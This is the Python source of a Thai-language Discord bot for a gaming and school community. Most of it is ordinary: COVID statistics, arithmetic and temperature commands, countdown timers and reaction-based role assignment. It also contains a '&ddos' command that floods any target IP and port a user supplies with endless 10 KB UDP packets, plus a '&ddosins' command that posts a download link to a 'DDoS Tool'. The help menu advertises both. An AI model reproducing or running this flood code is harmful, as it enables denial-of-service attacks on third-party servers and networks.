import discord
from discord.utils import get
from discord.ext import commands
import datetime
import urllib.parse, urllib.request, re
import requests
from time import sleep
import math
import socket
import os
import serial
import asyncio
#import dht11test


intents = discord.Intents.default()
intents.members = True

bot = commands.Bot(command_prefix='%', description="พูดมากว่ะ", intents=intents)
bot.remove_command('help')


# COVID COMMAND
stat_url = "https://covid19.th-stat.com/api/open/"

emo = {
	"blank" : '<:pai__blank:775679312619634698>',
	"up_red" : '<:pai__up_red:775694925941047316>',
	"up_green" : '<:pai__up_green:775694925924794368>',
	"down_red" : '<:pai__down_red:775694925748633651>',
	"down_green" : '<:pai__down_green:775694925844840479>'
}

async def covid_stat(ctx, minimal=False) :
	response = requests.get(stat_url + "today")
	data = response.json()
	datestr = data["UpdateDate"]
	dataformat = {
		"Confirmed" : ('mask', False),
		"Deaths" : ('skull', False),
		"Recovered" : ('sparkling_heart', True),
		"Hospitalized" : ('hospital', False)
	}

	blank_emoji = emo["blank"]
	def digits_gen(number, max_length, symbol=False, positive=True) :
		numstr = ("zero", "one", "two", "three", "four", "five", "six", "seven", "eight", "nine")
		if symbol :
			resstr = emo[((("up_green" if number > 0 else "down_red") if positive else ("up_red" if number > 0 else "down_green"))) if number != 0 else "blank"]
		else :	
			resstr = ""
		number = str(abs(number))
		if len(number) < max_length :
			resstr += blank_emoji * (max_length - len(number))
		for c in number :
			resstr += ':{}:'.format(numstr[int(c)])
		return resstr

	tempstr = ":{}:{}{}"
	await ctx.send("รายงานสถานการณ์ COVID-19 ในประเทศไทย\n" + datestr)
	final = [tempstr.format(dataformat[topic][0], blank_emoji + digits_gen(data[topic], max([len(str(abs(data[c]))) for c in list(dataformat.keys())])) + blank_emoji, digits_gen(data["New"+topic], max([len(str(abs(data["New"+c]))) for c in list(dataformat.keys())]), True, dataformat[topic][1])) for topic in list(dataformat.keys())]
	if minimal :
		await ctx.send("\n".join(final))
	else :
		for f in final :
			await ctx.send(f)

# Dev Mode
bot.devmode = 0

@bot.command()
async def devmode_on(ctx):
	if bot.devmode == 0 and 269000561255383040 == ctx.message.author.id:
		bot.devmode += 1
		await ctx.send("**DevMode: ON ✅**")
		await bot.change_presence(activity=discord.Game(name="Version: InDev 1.4.0"))
	else:
		await ctx.send("**Developer Mode is already ON**")

@bot.command()
async def devmode_off(ctx):
	if bot.devmode == 1 and 269000561255383040 == ctx.message.author.id:
		bot.devmode -= 1
		await ctx.send("**DevMode: OFF ❎**")
		await bot.change_presence(activity=discord.Game(name="Version: 1.4.0"))
	else:
		await ctx.send("**Developer Mode is already OFF**")

bot.whitelist_list = []

@bot.command()
async def whitelist_add(ctx, user: discord.Member):
	if bot.devmode == 1:
		try:	
			list1 = bot.whitelist_list
			index_chk = list1.index(str(user))
			await ctx.send(f"⚠️ User already exist")
		except:
			bot.whitelist_list.append(str(user))
			await ctx.send(f"☑️ Added **{user}** to whilelist")
	else:
		await ctx.send("Developer Mode is OFF ❎")

@bot.command()
async def whitelist_del(ctx, user: discord.Member):
	if bot.devmode == 1:
		try:
			bot.whitelist_list.remove(str(user))
			await ctx.send(f"❎ Removed **{user}** from whilelist")
		except:
			list1 = bot.whitelist_list
			index_chk = list1.index(str(user))
			await ctx.send(f"⚠️ User does not exist")
			
	else:
		await ctx.send("Developer Mode is OFF ❎")

@bot.command()
async def whitelist_check(ctx):
	list_size = len(bot.whitelist_list)
	if list_size == 0:
		await ctx.send("ℹ️ Whitelist has empty")
	else:
		embed_check = ""

		for i in range(list_size):
			num_title = i+1
			#await ctx.send(f"{num_title}.{bot.whitelist_list[i]}")
			embed_check += f"{num_title}.{bot.whitelist_list[i]}\n"

		show = discord.Embed(title = "ℹ️ **Whitelist**", color = 0x00FF00)
		show.description = embed_check

		await ctx.send(embed = show)


@bot.command()
async def welcome(ctx):
	welcome = discord.Embed(title = "**ยินดีต้อนรับสู่ GGWP'Games Room !**", description = "ขอให้โชคดี 😀", color = 0x00FF00)
	welcome.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/779671284786528276/Stonk.gif")
	await ctx.send(embed = welcome)

@bot.command()
async def congrat(ctx):
	congrat = discord.Embed(title = "**CONGRATULATION!!**", description = "ยินดีด้วย!! 🎉🎉", color = 0x00FF00)
	congrat.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/780126909421846548/Congrat.gif")
	await ctx.send(embed = congrat)


# OS
@bot.command()
async def shutdown(ctx):
	print("Shutting down...")
	await ctx.send("❌ Shutting down...")
	ctx.bot.logout()

@bot.command()
async def restart(ctx):
	print("Restarting...")
	await ctx.send("♻️ Restarting...")
	os.system('RunBot.py')


# Math
@bot.command()
async def sum(ctx, numOne: float, numTwo: float):
	sum = numOne + numTwo
	await ctx.send(f"{numOne} + {numTwo} = {sum}")

@bot.command()
async def dif(ctx, numOne: float, numTwo: float):
	dif = numOne - numTwo
	await ctx.send(f"{numOne} - {numTwo} = {dif}")

@bot.command()
async def mul(ctx, numOne: float, numTwo: float):
	try :
		mul = numOne * numTwo
	except OverflowError :
		await ctx.send("**Error ⚠️**")
		return
	await ctx.send(f"{numOne} × {numTwo} = {mul}")

@bot.command()
async def div(ctx, numOne: float, numTwo: float):
	try :
		div = numOne / numTwo
	except ZeroDivisionError :
		await ctx.send("**Error ⚠️**")
		return
	await ctx.send(f"{numOne} ÷ {numTwo} = {div}")	

@bot.command()
async def pow(ctx, numOne: float, numTwo: float):
	try :
		pow = numOne ** numTwo
	except OverflowError :
		await ctx.send("**Error ⚠️**")
		return
	await ctx.send(f"{numOne} ^ {numTwo} = {pow}")

@bot.command()
async def sqrt(ctx, sqrtnum: float, number: int):
	sqrt = number**(1/sqrtnum)
	await ctx.send(f"รากที่ {sqrtnum} ของ {number} = {sqrt}")

@bot.command()
async def fac(ctx, number: int):
	try :
		fac = math.factorial(number)
	except OverflowError :
		await ctx.send("**Error ⚠️**")
		return
	await ctx.send(f"{number}! = {fac}")

@bot.command()
async def update(ctx):
	u = discord.Embed(title = "📌 **Update**", color = 0x00FF00)
	u.add_field(name="1️⃣ V.1.0.0 | 16/12/2020", value="`• Status: Online 24/7\n• Delete: &shutdown\n• Delete: &restart\n• Delete: &pyramid\n• Delete: &yt\n• Delete: &ddos\n• Delete: &square\n• Delete: &dht11`")
	u.add_field(name="2️⃣ V.1.1.0 | 22/12/2020", value="`• Add: &update\n• Add: Embed for &covid\n• Add: Limit of &fac\n• Fix: &sqrt\n• Fix: Loop หวัดดี,สวัสดี\n• Delete: &dht11 in &help\n• Delete: on_member_join`")
	u.add_field(name="3️⃣ V.1.1.1 | 25/12/2020", value="`• Fix: Decimal number limit\n• Delete: Some auto detection word`")
	u.add_field(name="4️⃣ V.1.2.0 | 01/02/2021", value="`• Add: Reaction Role Assignment`")
	u.add_field(name="5️⃣ V.1.3.0 | 23/04/2021", value="`• Add: &event\n• Fix: &countdown`")
	u.add_field(name="6️⃣ V.1.3.1 | 29/04/2021", value="`• Add: &devmode\n• Add: &status\n• Fix: Activity Name\n• Fix: &countdown`")
	u.add_field(name="7️⃣ V.1.4.0 | 06/06/2021", value="`• Add: PrivateKey Role assignment\n• Add: Moderator Role assignment\n• Add: Whitelist\n• Fix: Role Name`")
	await ctx.send(embed = u)

@bot.command()
async def help(ctx):
	h = discord.Embed(title = "❔ **Help**", color = 0x00FF00)
	h.add_field(name="ℹ️ ข้อมูลกลุ่ม", value="`&guild`")
	h.add_field(name="🙏 ข้อความต้อนรับ", value="`&welcome`")
	h.add_field(name="🎉 ข้อความยินดี", value="`&congrat`")
	h.add_field(name="📩 เชิญบอท", value="`&invite`")
	h.add_field(name="📐 คำนวณเลข", value="`&help_math`")
	h.add_field(name="⏲️ เคานต์ดาวน์", value="`&countdown [เวลา]`")
	h.add_field(name="⏹ หยุดการนับเคานต์ดาวน์", value="`&cancel_countdown`")
	h.add_field(name="🔑 ให้ PrivateKey", value="`&privatekey [@USER]`")
	h.add_field(name="🔒 ยกเลิก PrivateKey", value="`&cancel_privatekey`")
	h.add_field(name="🎟 เป็น Moderator", value="`&moderator`")
	h.add_field(name="🧺 ยกเลิกสิทธิ Moderator", value="`&cancel_moderator`")
	h.add_field(name="🔺 สร้างพีระมิด [ERROR]", value="`&pyramid [จำนวนชั้น]`")
	h.add_field(name="📐 สร้างสามเหลี่ยมมุมฉาก", value="`&right_triangle [จำนวนชั้น]`")
	h.add_field(name="🔄 แปลงหน่วยอุณหภูมิ", value="`&help_temp`")
	h.add_field(name="😷 ตรวจสอบสถานการณ์ไวรัส COVID-19", value="`&covid`")
	h.add_field(name="🌡 ตรวจสอบอุณหภูมิและความชื้น", value="`&dht11`")
	h.add_field(name="🔄 แปลงเปอร์เซ็นต์และตัวเลข", value="`&help_percent`")
	h.add_field(name="▶️ Youtube Search [ERROR]", value="`&yt [ชื่อคลิป]`")
	h.add_field(name="🚀 โปรแกรมยิงไอพี DDoS Tool", value="`&ddosins`")
	h.add_field(name="📡 ยิงไอพี", value="`&ddos [Target] [Port]`")
	h.add_field(name="🎆 ประกาศอีเวนต์", value="`&event [CHAT_ID]|[ชื่อ]|[คำอธิบาย]|[LOGO URL]`")
	h.add_field(name="❌ ปิดการทำงานบอท", value="`&shutdown`")
	h.add_field(name="♻ รีบูตการทำงานบอท", value="`&restart`")
	await ctx.send(embed = h)

@bot.command()
async def help_math(ctx):
	hm = discord.Embed(title = "📐 **คำนวณเลข**", color = 0x00FF00)
	hm.add_field(name="`➕` บวก", value="`&sum [Num 1] [Num 2]`")
	hm.add_field(name="`➖` ลบ", value="`&dif [Num 1] [Num ]`")
	hm.add_field(name="`✖️` คูณ", value="`&mul [Num 1] [Num 2]`")
	hm.add_field(name="`➗` หาร", value="`&div [Num 1] [Num 2]`")
	hm.add_field(name="💪 ยกกำลัง", value="`&pow [Num 1] [Num 2]`")
	hm.add_field(name="`√` ถอดราก", value="`&sqrt [Number] [Sqrt Num]`")
	hm.add_field(name="`!` แฟกทอเรียล", value="`&fac [Number]`")
	await ctx.send(embed = hm)

@bot.command()
async def help_temp(ctx):
	ht = discord.Embed(title = "🔄 **แปลงหน่วยอุณหภูมิ**", color = 0x00FF00)
	ht.add_field(name="°C เป็น °F", value="`&ctf [Temp °C]`")
	ht.add_field(name="°F เป็น °C ", value="`&ftc [Temp °F]`")
	ht.add_field(name="°C เป็น K", value="`&ctk [Temp °C]`")
	ht.add_field(name="K เป็น °C", value="`&ktc [Temp K]`")
	ht.add_field(name="°F เป็น K", value="`&ftk [Temp °F]`")
	ht.add_field(name="K เป็น °F", value="`&ktf [Temp K]`")
	await ctx.send(embed = ht)

@bot.command()
async def help_percent(ctx):
	pn = discord.Embed(title = "🔄 **แปลงเปอร์เซ็นต์และตัวเลข**", color = 0x00FF00)
	pn.add_field(name="เปอร์เซ็นต์เป็นตัวเลข", value="`&ptn [%] [Total]`")
	pn.add_field(name="ตัวเลขเป็นเปอร์เซ็นต์", value="`&ntp [Number] [Total]`")
	await ctx.send(embed = pn)

@bot.command()
async def guild(ctx):
	print(ctx.guild.owner)
	print(ctx.guild.owner.mention)
	embed = discord.Embed(title=f"{ctx.guild.name}", timestamp=datetime.datetime.utcnow(), color=discord.Color.green())
	embed.add_field(name="สร้างเมื่อ", value=f"`{ctx.guild.created_at}`")
	embed.add_field(name="เจ้าของ", value=f"{ctx.guild.owner.mention}")
	embed.add_field(name="ภูมิภาค", value=f"`{ctx.guild.region}`")
	embed.add_field(name="ไอดีของเซิฟเวอร์", value=f"`{ctx.guild.id}`")
	embed.add_field(name="ข้อจำกัด", value=f"`อีโมจิ : {ctx.guild.emoji_limit}\nบิตเรท : {ctx.guild.bitrate_limit}\nขนาดไฟล์ : {ctx.guild.filesize_limit}`")
	# embed.set_thumbnail(url=f"{ctx.guild.icon}")
	embed.set_thumbnail(url=f"{ctx.guild.icon_url}")

	await ctx.send(embed=embed)

@bot.command()
async def yt(ctx, *, search):

	query_string = urllib.parse.urlencode({
		'search_query': search
	})
	htm_content = urllib.request.urlopen(
		'http://www.youtube.com/results?' + query_string
	)
	# print(html_content.read().decode())
	search_results = re.findall('href=\"\\/watch\\?v=(.{11})', htm_content.read().decode())
	# I will put just the first result, you can loop the response to show more results
	await ctx.send('http://www.youtube.com/watch?v=' + search_results[0])


# Temp
@bot.command()
async def ctf(ctx, tempc: float):
	await ctx.send(str("{:.2f}".format(((9*tempc)/5)+32) + ' °F'))

@bot.command()
async def ftc(ctx, tempf: float):
	await ctx.send(str("{:.2f}".format((((tempf-32)/9)*5)) + ' °C'))

@bot.command()
async def ctk(ctx, tempc: float):
	await ctx.send(str("{:.2f}".format((tempc+273)) + ' K'))

@bot.command()
async def ktc(ctx, tempk: float):
	await ctx.send(str("{:.2f}".format((tempk-273)) + ' °C'))

@bot.command()
async def ftk(ctx, tempf: float):
	await ctx.send(str("{:.2f}".format((((5*(tempf-32))/9)+273)) + ' K'))

@bot.command()
async def ktf(ctx, tempk: float):
	await ctx.send(str("{:.2f}".format((((tempk-273)*9)/5)+32) + ' °F'))


@bot.command()
async def covid(ctx) :
	is_on_mobile = getattr(ctx.message.author, "is_on_mobile", None)
	if callable(is_on_mobile) :
		await covid_stat(ctx, is_on_mobile())
		return
	else :
		await covid_stat(ctx)

@bot.command()
async def pyramid(ctx, size: int):
	noname1 = ""
	space = size - 1
	for a in range(0, size):
		for s in range(0, space):
			noname1 += "\n"
		space -= 1
		for x in range(0, a+1):
			if x == a:
				noname1 += "\*"
			else:
				noname1 += "\*\*"
		await ctx.send(noname1)

@bot.command()
async def right_triangle(ctx, size: int):
	result = ""
	for i in range(size):
		result += "\*"*(i+1) + "\n"
	await ctx.send(result)

@bot.command()
async def square(ctx, size: int):
	for y in range(size) :
		if y == 0 or y == size-1 :
			await ctx.send("#"*size)
		else :
			await ctx.send("#",end="")
			await ctx.send(" "*(size-2), end="")
			await ctx.send("#")


# Percent
@bot.command()
async def ptn(ctx, percent: float, total: float):
	ptn_result = (percent/100)*total
	await ctx.send(f'{percent}% of {total} = {ptn_result}')

@bot.command()
async def ntp(ctx, number:float, total:float):
	ntp_result = (number/total)*100
	await ctx.send(f'{number} of {total} = {ntp_result}%')

@bot.command()
async def ddosins(ctx):
	ddos = discord.Embed(title = "🚀 **DDoS Tool V1.0**", color = 0x00FF00)
	ddos.description ="[DOWNLOAD](https://drive.google.com/u/0/uc?export=download&confirm=Qu7_&id=1McyRQuqqqsDYstMCSP2gzCKn7cHt8jgx)"
	ddos.set_thumbnail(url="https://cdn.discordapp.com/attachments/778868879567880192/781516216987680788/DDoS_LOGO.jpg")
	await ctx.send(embed = ddos)

@bot.command()
async def send(ctx, id, *, text):
	if 269000561255383040 == ctx.message.author.id :
		channel = ctx.bot.get_channel(int(id))
		await channel.send(text)

@bot.command()
async def invite(ctx):
	invite = discord.Embed(title = "📩 **เชิญบอท**", color = 0x00FF00)
	invite.description ="[Click Here](https://discord.com/oauth2/authorize?client_id=778302031042576395&permissions=247872&scope=bot)"
	await ctx.send(embed = invite)

#@bot.command()
#async def caplock(ctx,* , text):
#	list1 = []                                         
#	list1 += str(text)                            
#	text_size = len(list1)
#
#	for i in range(text_size):
#		x = list1[i]
#		text_ascii = ord(x)
#
#		if text_ascii == 32 :
#			await ctx.send("ว่าง")
#
	#ตัวพิมพ์ใหญ่
#		if text_ascii >= 65 and text_ascii <= 90:
#			text_out_ascii = text_ascii + 32              #แปลง
#			text_out = chr(text_out_ascii)                #ตัวพิมพ์เล็ก
#			text_out_sep = text_out
#			await ctx.send(text_out)
	#ตัวพิมพ์เล็ก
#		elif text_ascii >= 97 and text_ascii <= 122:
#			text_out_ascii = text_ascii - 32              #แปลง
#			text_out = chr(text_out_ascii)                #ตัวพิมพ์ใหญ่
#			await ctx.send(text_out)


@bot.command()
async def event(ctx, *, text):
	list1 = []
	list1 = text.split('|')
	id = list1[0]
	title = list1[1]
	date = list1[2]
	url = list1[3]
	

	show = discord.Embed(title = "**EVENT** 🎆", color = 0x00FF00)
	show.set_thumbnail(url=url)
	show.add_field(name=title, value=date)

	channel = ctx.bot.get_channel(int(id))
	await channel.send(embed = show)


# Countdown
bot.cancel_code = 0
bot.timer_new = 0

@bot.command()
async def countdown(ctx, timer: int):
	if timer <= 0:
		await ctx.send("**Invalid Timer ⚠️**")
		return

	bot.timer_new = timer
	day = int(bot.timer_new / 86400)
	sade = int(bot.timer_new % 86400)
	hour = int(sade / 3600)
	sade2 = int(sade % 3600)
	minute = int(sade2 / 60)
	second = int(sade2 % 60)

	#ปรับขนาดตัวอักษร
	day_str = str(day)
	hour_str = str(hour)
	minute_str = str(minute)
	second_str = str(second)

	day_zfill = day_str.zfill(2)
	hour_zfill = hour_str.zfill(2)
	minute_zfill = minute_str.zfill(2)
	second_zfill = second_str.zfill(2)

	message = await ctx.send(f"Time remaining: **{day_zfill}:{hour_zfill}:{minute_zfill}:{second_zfill}**")

	while bot.timer_new >= 0:
		day = int(bot.timer_new / 86400)
		sade = int(bot.timer_new % 86400)
		hour = int(sade / 3600)
		sade2 = int(sade % 3600)
		minute = int(sade2 / 60)
		second = int(sade2 % 60)

		#ปรับขนาดตัวอักษร
		day_str = str(day)
		hour_str = str(hour)
		minute_str = str(minute)
		second_str = str(second)

		day_zfill = day_str.zfill(2)
		hour_zfill = hour_str.zfill(2)
		minute_zfill = minute_str.zfill(2)
		second_zfill = second_str.zfill(2)

				
		await message.edit(content=f"Time remaining: **{day_zfill}:{hour_zfill}:{minute_zfill}:{second_zfill}**")
		await asyncio.sleep(1)
		bot.timer_new -= 1

	if bot.timer_new <= 1 and bot.timer_new >= -3:
		await message.edit(content="Time remaining: **Time Up !!**")

	elif bot.timer_new < -5:
		await message.edit(content="Time remaining: **STOPPED !!**")

		
				
@bot.command()			
async def cancel_countdown(ctx):
	bot.timer_new = -1020304
	await ctx.send("⏹ Canceled")


#@bot.command()			
#async def dht11(ctx):
#	await ctx.send(dht11test.dht11_out())

@bot.command()
async def ddos(ctx, target:str, port:int):
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
		byte = os.urandom(10240)

		sent = 1

		while True:
			out = ""
			s.sendto(byte, (target, port))
			out += f"Sending {sent} To {target} with port {port}"
			sent = sent + 13466

			await ctx.send(out)
			sleep(5)



@bot.command()
async def moderator(ctx):
	user = ctx.message.author
	bot.user_name = user
	role = discord.utils.get(user.guild.roles, name="Moderator")
	await user.add_roles(role)

	bot.timer_moderator = 86399
	day = int(bot.timer_moderator / 86400)
	sade = int(bot.timer_moderator % 86400)
	hour = int(sade / 3600)
	sade2 = int(sade % 3600)
	minute = int(sade2 / 60)
	second = int(sade2 % 60)

	#ปรับขนาดตัวอักษร
	day_str = str(day)
	hour_str = str(hour)
	minute_str = str(minute)
	second_str = str(second)

	hour_zfill = hour_str.zfill(2)
	minute_zfill = minute_str.zfill(2)
	second_zfill = second_str.zfill(2)

	await ctx.send(f"✅ **{user}** are moderator now")
	await ctx.send(f"ℹ️ **{user}** can use <#827531528157659226>")
	message = await ctx.send(f"⚠️ **{hour_zfill}:{minute_zfill}:{second_zfill}** before the license expires")

	while bot.timer_moderator >= 0:
		day = int(bot.timer_moderator / 86400)
		sade = int(bot.timer_moderator % 86400)
		hour = int(sade / 3600)
		sade2 = int(sade % 3600)
		minute = int(sade2 / 60)
		second = int(sade2 % 60)

		#ปรับขนาดตัวอักษร
		day_str = str(day)
		hour_str = str(hour)
		minute_str = str(minute)
		second_str = str(second)

		hour_zfill = hour_str.zfill(2)
		minute_zfill = minute_str.zfill(2)
		second_zfill = second_str.zfill(2)

				
		await message.edit(content=f"⚠️ **{hour_zfill}:{minute_zfill}:{second_zfill}** before the license expires")
		await asyncio.sleep(1)
		bot.timer_moderator -= 1

	if bot.timer_moderator <= 1 and bot.timer_moderator >= -3:
		await user.remove_roles(role)
		await message.edit(content="⛔ **License expired**")

	elif bot.timer_moderator < -5:
		await user.remove_roles(role)
		await message.edit(content="🛑 **License canceled**")

@bot.command()			
async def cancel_mod(ctx):
	bot.timer_moderator = -1020304
	await ctx.send(f"⛔** {bot.user_name}** has left as a moderator")


@bot.command()
async def privatekey(ctx, user: discord.Member):
	author = str(ctx.message.author)
	list1 = bot.whitelist_list

	if author in list1:
		bot.user_name_privatekey = user
		role = discord.utils.get(user.guild.roles, name="PrivateKey")
		await user.add_roles(role)

		bot.timer_private = 86399
		day = int(bot.timer_private / 86400)
		sade = int(bot.timer_private % 86400)
		hour = int(sade / 3600)
		sade2 = int(sade % 3600)
		minute = int(sade2 / 60)
		second = int(sade2 % 60)

		#ปรับขนาดตัวอักษร
		day_str = str(day)
		hour_str = str(hour)
		minute_str = str(minute)
		second_str = str(second)

		hour_zfill = hour_str.zfill(2)
		minute_zfill = minute_str.zfill(2)
		second_zfill = second_str.zfill(2)

		await ctx.send(f"✅ **{user}** can use <#681876532834205721>")
		message = await ctx.send(f"ℹ️ **{hour_zfill}:{minute_zfill}:{second_zfill}** before the PrivateKey expires")

		while bot.timer_private >= 0:
			day = int(bot.timer_private / 86400)
			sade = int(bot.timer_private % 86400)
			hour = int(sade / 3600)
			sade2 = int(sade % 3600)
			minute = int(sade2 / 60)
			second = int(sade2 % 60)

			#ปรับขนาดตัวอักษร
			day_str = str(day)
			hour_str = str(hour)
			minute_str = str(minute)
			second_str = str(second)

			hour_zfill = hour_str.zfill(2)
			minute_zfill = minute_str.zfill(2)
			second_zfill = second_str.zfill(2)

				
			await message.edit(content=f"ℹ️ **{hour_zfill}:{minute_zfill}:{second_zfill}** before the PrivateKey expires")
			await asyncio.sleep(1)
			bot.timer_private -= 1

		if bot.timer_private <= 1 and bot.timer_private >= -3:
			await user.remove_roles(role)
			await message.edit(content="⛔ **PrivateKey expired**")

		elif bot.timer_private < -5:
			await user.remove_roles(role)
			await message.edit(content="🛑 **PrivateKey canceled**")
	else:
		await ctx.send(f"❎ **{author}** are not on the whitelist.")

@bot.command()			
async def cancel_privatekey(ctx):
	list1 = bot.whitelist_list
	author = str(ctx.message.author)
	if author in list1:
		bot.timer_private = -1020304
		await ctx.send(f"⛔ All PrivateKey have been canceled")
	else:
		await ctx.send(f"❎ **{author}** are not on the whitelist.")



# Events
@bot.event
async def on_raw_reaction_add(payload):
	message_id = payload.message_id
	if message_id == 851064004264329266:
		guild_id = payload.guild_id
		guild = discord.utils.find(lambda g : g.id == guild_id, bot.guilds)

		if payload.emoji.name == '1_':
			role = discord.utils.get(guild.roles, name = 'คณะล่าผี')
		elif payload.emoji.name == '2_':
			role = discord.utils.get(guild.roles, name = 'Genshin Impact')
		elif payload.emoji.name == '3_':
			role = discord.utils.get(guild.roles, name = 'Microsoft Flight Simulator')
		elif payload.emoji.name == '4_':
			role = discord.utils.get(guild.roles, name = 'Far Cry')
		elif payload.emoji.name == '5_':
			role = discord.utils.get(guild.roles, name = 'Dead by Daylight')
		elif payload.emoji.name == '6_':
			role = discord.utils.get(guild.roles, name = 'Rainbow Six Siege')
		elif payload.emoji.name == '7_':
			role = discord.utils.get(guild.roles, name = 'Forza Horizon 4')
		elif payload.emoji.name == '8_':
			role = discord.utils.get(guild.roles, name = 'League of Legends')
		elif payload.emoji.name == '9_':
			role = discord.utils.get(guild.roles, name = 'PUBG')
		elif payload.emoji.name == '10_':
			role = discord.utils.get(guild.roles, name = 'Valorant')
		elif payload.emoji.name == '11_':
			role = discord.utils.get(guild.roles, name = 'Minecraft')
		elif payload.emoji.name == '12_':
			role = discord.utils.get(guild.roles, name = 'Roblox')
		elif payload.emoji.name == '13_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ603')
		elif payload.emoji.name == '14_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ604')
		elif payload.emoji.name == '15_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ605')
		elif payload.emoji.name == '16_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ609')
		elif payload.emoji.name == '17_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ610')
		elif payload.emoji.name == '18_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ611')
		elif payload.emoji.name == '19_':
			role = discord.utils.get(guild.roles, name = 'นักตัดงานคุณภาพ')
		elif payload.emoji.name == '20_':
			role = discord.utils.get(guild.roles, name = 'เสพกาววีทูปเบอร์')
		elif payload.emoji.name == '21_':
			role = discord.utils.get(guild.roles, name = 'Sportsman')
		else:
			role = discord.utils.get(guild.roles, name = payload.emoji.name)

		if role is not None:
			member = discord.utils.find(lambda m : m.id == payload.user_id, guild.members)
			if member is not None:
				await member.add_roles(role)
				print("Role Add Done")
			else:
				print("Member not found")
		else:
			print("Role not found")

@bot.event
async def on_raw_reaction_remove(payload):
	message_id = payload.message_id
	if message_id == 851064004264329266:
		guild_id = payload.guild_id
		guild = discord.utils.find(lambda g : g.id == guild_id, bot.guilds)

		if payload.emoji.name == '1_':
			role = discord.utils.get(guild.roles, name = 'คณะล่าผี')
		elif payload.emoji.name == '2_':
			role = discord.utils.get(guild.roles, name = 'Genshin Impact')
		elif payload.emoji.name == '3_':
			role = discord.utils.get(guild.roles, name = 'Microsoft Flight Simulator')
		elif payload.emoji.name == '4_':
			role = discord.utils.get(guild.roles, name = 'Far Cry')
		elif payload.emoji.name == '5_':
			role = discord.utils.get(guild.roles, name = 'Dead by Daylight')
		elif payload.emoji.name == '6_':
			role = discord.utils.get(guild.roles, name = 'Rainbow Six Siege')
		elif payload.emoji.name == '7_':
			role = discord.utils.get(guild.roles, name = 'Forza Horizon 4')
		elif payload.emoji.name == '8_':
			role = discord.utils.get(guild.roles, name = 'League of Legends')
		elif payload.emoji.name == '9_':
			role = discord.utils.get(guild.roles, name = 'PUBG')
		elif payload.emoji.name == '10_':
			role = discord.utils.get(guild.roles, name = 'Valorant')
		elif payload.emoji.name == '11_':
			role = discord.utils.get(guild.roles, name = 'Minecraft')
		elif payload.emoji.name == '12_':
			role = discord.utils.get(guild.roles, name = 'Roblox')
		elif payload.emoji.name == '13_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ603')
		elif payload.emoji.name == '14_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ604')
		elif payload.emoji.name == '15_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ605')
		elif payload.emoji.name == '16_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ609')
		elif payload.emoji.name == '17_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ610')
		elif payload.emoji.name == '18_':
			role = discord.utils.get(guild.roles, name = 'SKR#24ㅣ611')
		elif payload.emoji.name == '19_':
			role = discord.utils.get(guild.roles, name = 'นักตัดงานคุณภาพ')
		elif payload.emoji.name == '20_':
			role = discord.utils.get(guild.roles, name = 'เสพกาววีทูปเบอร์')
		elif payload.emoji.name == '21_':
			role = discord.utils.get(guild.roles, name = 'Sportsman')
		else:
			role = discord.utils.get(guild.roles, name = payload.emoji.name)

		if role is not None:
			member = discord.utils.find(lambda m : m.id == payload.user_id, guild.members)
			if member is not None:
				await member.remove_roles(role)
				print("Role Remove Done")
			else:
				print("Member is not found")
		else:
			print("Role is not found")

@bot.command()
async def addrole(ctx, id):
	a = discord.Embed(title = "📝 **React me to assign the role**", color = 0x00FF00)
	a.add_field(name="**🎮 Game**", value="`0️⃣1️⃣ㅣคณะล่าผี\n0️⃣2️⃣ㅣGenshin Impact\n0️⃣3️⃣ㅣMicrosoft Flight Simulator\n0️⃣4️⃣ㅣFar Cry\n0️⃣5️⃣ㅣDead by Daylight\n0️⃣6️⃣ㅣRainbow Six Siege\n0️⃣7️⃣ㅣForza Horizon 4\n0️⃣8️⃣ㅣLeague of Legends\n0️⃣9️⃣ㅣPUBG\n1️⃣0️⃣ㅣValorant\n1️⃣1️⃣ㅣMinecraft\n1️⃣2️⃣ㅣRoblox`")
	a.add_field(name="**🏫 School**", value="`1️⃣3️⃣ㅣSKR#24ㅣ603\n1️⃣4️⃣ㅣSKR#24ㅣ604\n1️⃣5️⃣ㅣSKR#24ㅣ605\n1️⃣6️⃣ㅣSKR#24ㅣ609\n1️⃣7️⃣ㅣSKR#24ㅣ610\n1️⃣8️⃣ㅣSKR#24ㅣ611`")
	a.add_field(name="**💡 Other**", value="`1️⃣9️⃣ㅣนักตัดงานคุณภาพ\n2️⃣0️⃣ㅣเสพกาววีทูปเบอร์\n2️⃣1️⃣ㅣSportsman`")

	if 269000561255383040 == ctx.message.author.id :
		channel = ctx.bot.get_channel(int(id))
		await channel.send(embed = a)

@bot.command()
async def status(ctx, text: str):
	if bot.devmode == 1:
		await bot.change_presence(activity=discord.Game(name=text))
		await ctx.send("**Successfully ✅**")
	else:
		await ctx.send("**Developer Mode is OFF ❎**")

@bot.event
async def on_ready():
	await bot.change_presence(activity=discord.Game(name="Version: 1.4.0"))
	print('Started!')


@bot.event
async def on_member_join(person):
	member_role_id = 851081137093738576
	await person.add_roles(person.guild.get_role(member_role_id))


# Listen
async def on_command(ctx):
	ch = ctx.bot.get_channel(782287323261304853)
	await ch.send("test")

@bot.listen()
async def on_message(message):
	if "fuck" in message.content.lower():
		await message.channel.send('Hey!')

	elif "สวัสดี" in message.content.lower():
		if message.author.id == bot.user.id:
			return
		if message.author.id == 778302031042576395:
			return
		await message.channel.send('สวัสดี 🙏😀')

	elif "หวัดดี" in message.content.lower():
		if message.author.id == bot.user.id:
			return
		if message.author.id == 778302031042576395:
			return
		await message.channel.send('หวัดดี 🙏😀')

	elif "okay" in message.content.lower():
		await message.channel.send('hmmmmmm🤔')

	elif "shut up" in message.content.lower():
		await message.channel.send("👌 if you did't say it again")

	elif "เห้ย" in message.content.lower():
		await message.channel.send('ไรหยอ 🤨')

	elif "wtf" in message.content.lower():
		await message.channel.send('...')

	elif "rip" in message.content.lower():
		await message.channel.send('F')

